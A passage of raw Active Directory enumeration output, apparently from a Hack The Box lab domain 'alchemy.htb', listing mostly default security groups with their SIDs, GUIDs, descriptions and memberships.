iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-520}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : b48b92f9-4571-45e6-92b8-a8c53a2a06ee

name                           : Group Policy Creator Owners

distinguishedname              : CN=Group Policy Creator Owners,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Group Policy Creator Owners

member                         : {CN=Administrator,CN=Users,DC=alchemy,DC=htb}

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb}

cn                             : {Group Policy Creator Owners}

objectclass                    : {top, group}

usnchanged                     : 12391

description                    : Members in this group can modify group policy for the domain

instancetype                   : 4

usncreated                     : 12354

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-553}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 3d7312c4-75ef-45a4-ae79-682977a362f4

name                           : RAS and IAS Servers

distinguishedname              : CN=RAS and IAS Servers,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : RAS and IAS Servers

cn                             : {RAS and IAS Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12359

instancetype                   : 4

usncreated                     : 12357

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Servers in this group can access remote access properties of users

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-32-549}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 80b24a56-5c7f-4dba-8f2b-2f2a762ff0eb

name                           : Server Operators

distinguishedname              : CN=Server Operators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Server Operators

cn                             : {Server Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12783

instancetype                   : 4

usncreated                     : 12360

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

admincount                     : 1

description                    : Members can administer domain servers

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-548}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 8c9a230d-b2e7-436e-8829-5bc962861002

name                           : Account Operators

distinguishedname              : CN=Account Operators,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Account Operators

cn                             : {Account Operators}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12778

instancetype                   : 4

usncreated                     : 12363

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

admincount                     : 1

description                    : Members can administer domain user and group accounts

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-554}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : c4fbd40b-849c-49f3-bae1-02a973617f2a

name                           : Pre-Windows 2000 Compatible Access

distinguishedname              : CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Pre-Windows 2000 Compatible Access

member                         : {CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=alchemy,DC=htb}

cn                             : {Pre-Windows 2000 Compatible Access}

objectclass                    : {top, group}

usnchanged                     : 12393

description                    : A backward compatibility group which allows read access on all users and groups in the domain

instancetype                   : 4

usncreated                     : 12366

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-557}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : b25fd431-a20a-46c9-81c5-7736f03c5c6f

name                           : Incoming Forest Trust Builders

distinguishedname              : CN=Incoming Forest Trust Builders,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Incoming Forest Trust Builders

cn                             : {Incoming Forest Trust Builders}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12371

instancetype                   : 4

usncreated                     : 12369

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group can create incoming, one-way trusts to this forest

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-560}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : dedc4d50-6398-4b4e-b725-18e0fba20051

name                           : Windows Authorization Access Group

distinguishedname              : CN=Windows Authorization Access Group,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Windows Authorization Access Group

member                         : {CN=S-1-5-9,CN=ForeignSecurityPrincipals,DC=alchemy,DC=htb}

cn                             : {Windows Authorization Access Group}

objectclass                    : {top, group}

usnchanged                     : 12396

description                    : Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects

instancetype                   : 4

usncreated                     : 12372

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-32-561}

grouptype                      : CREATED_BY_SYSTEM, DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 9accadc1-f3f2-4ca4-a9a8-d8b7758eaa3b

name                           : Terminal Server License Servers

distinguishedname              : CN=Terminal Server License Servers,CN=Builtin,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Terminal Server License Servers

cn                             : {Terminal Server License Servers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12377

instancetype                   : 4

usncreated                     : 12375

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage

systemflags                    : -1946157056

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:00 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-571}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : 27803678-c15d-4db4-9829-6066415bbfd9

name                           : Allowed RODC Password Replication Group

distinguishedname              : CN=Allowed RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Allowed RODC Password Replication Group

cn                             : {Allowed RODC Password Replication Group}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12404

instancetype                   : 4

usncreated                     : 12402

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members in this group can have their passwords replicated to all read-only domain controllers in the domain

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-572}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : e2a15522-06ef-45dc-8099-092ab9c46792

name                           : Denied RODC Password Replication Group

distinguishedname              : CN=Denied RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Denied RODC Password Replication Group

member                         : {CN=Read-only Domain Controllers,CN=Users,DC=alchemy,DC=htb, CN=Group Policy Creator Owners,CN=Users,DC=alchemy,DC=htb, CN=Domain Admins,CN=Users,DC=alchemy,DC=htb, CN=Cert Publishers,CN=Users,DC=alchemy,DC=htb, CN=Enterprise Admins,CN=Users,DC=alchemy,DC=htb, CN=Schema Admins,CN=Users,DC=alchemy,DC=htb, CN=Domain Controllers,CN=Users,DC=alchemy,DC=htb, CN=krbtgt,CN=Users,DC=alchemy,DC=htb}

cn                             : {Denied RODC Password Replication Group}

objectclass                    : {top, group}

usnchanged                     : 12433

description                    : Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain

instancetype                   : 4

usncreated                     : 12405

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-521}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 4124e131-1b35-4188-b6dd-a3200201bae0

name                           : Read-only Domain Controllers

distinguishedname              : CN=Read-only Domain Controllers,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:37:42 PM

samaccountname                 : Read-only Domain Controllers

memberof                       : {CN=Denied RODC Password Replication Group,CN=Users,DC=alchemy,DC=htb}

cn                             : {Read-only Domain Controllers}

objectclass                    : {top, group}

usnchanged                     : 12790

description                    : Members of this group are Read-Only Domain Controllers in the domain

instancetype                   : 4

usncreated                     : 12419

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

admincount                     : 1

iscriticalsystemobject         : True

dscorepropagationdata          : {12/8/2023 10:37:42 PM, 12/8/2023 10:22:32 PM, 1/1/1601 12:04:16 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-498}

grouptype                      : UNIVERSAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 0d6de44f-844d-4277-b890-dc060df8caac

name                           : Enterprise Read-only Domain Controllers

distinguishedname              : CN=Enterprise Read-only Domain Controllers,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Enterprise Read-only Domain Controllers

cn                             : {Enterprise Read-only Domain Controllers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12431

instancetype                   : 4

usncreated                     : 12429

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group are Read-Only Domain Controllers in the enterprise

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-522}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 39b0b919-d025-40fa-adac-8a25145ebb32

name                           : Cloneable Domain Controllers

distinguishedname              : CN=Cloneable Domain Controllers,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Cloneable Domain Controllers

cn                             : {Cloneable Domain Controllers}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12442

instancetype                   : 4

usncreated                     : 12440

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group that are domain controllers may be cloned.

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-525}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 4910f825-5b89-466b-9f56-6762236347dd

name                           : Protected Users

distinguishedname              : CN=Protected Users,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:22:32 PM

whenchanged                    : 12/8/2023 10:22:32 PM

samaccountname                 : Protected Users

cn                             : {Protected Users}

objectclass                    : {top, group}

iscriticalsystemobject         : True

usnchanged                     : 12447

instancetype                   : 4

usncreated                     : 12445

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.

dscorepropagationdata          : {12/8/2023 10:22:32 PM, 1/1/1601 12:00:01 AM}



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-1102}

grouptype                      : DOMAIN_LOCAL_SCOPE, SECURITY

samaccounttype                 : ALIAS_OBJECT

objectguid                     : d5e89dc3-0c07-4788-8496-fa12de72d157

name                           : DnsAdmins

distinguishedname              : CN=DnsAdmins,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:23:12 PM

whenchanged                    : 12/8/2023 10:23:12 PM

samaccountname                 : DnsAdmins

cn                             : {DnsAdmins}

objectclass                    : {top, group}

usnchanged                     : 12470

instancetype                   : 4

usncreated                     : 12468

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : DNS Administrators Group

dscorepropagationdata          : 1/1/1601 12:00:00 AM



objectsid                      : {S-1-5-21-358850882-156636835-3866944949-1103}

grouptype                      : GLOBAL_SCOPE, SECURITY

samaccounttype                 : GROUP_OBJECT

objectguid                     : 155d701f-1700-48aa-b2ff-204e3ca2526d

name                           : DnsUpdateProxy

distinguishedname              : CN=DnsUpdateProxy,CN=Users,DC=alchemy,DC=htb

whencreated                    : 12/8/2023 10:23:12 PM

whenchanged                    : 12/8/2023 10:23:12 PM

samaccountname                 : DnsUpdateProxy

cn                             : {DnsUpdateProxy}

objectclass                    : {top, group}

usnchanged                     : 12473

instancetype                   : 4

usncreated                     : 12473

objectcategory                 : CN=Group,CN=Schema,CN=Configuration,DC=alchemy,DC=htb

description                    : DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).

dscorepropagationdata          : 1/1/1601 12:00:00 AM

```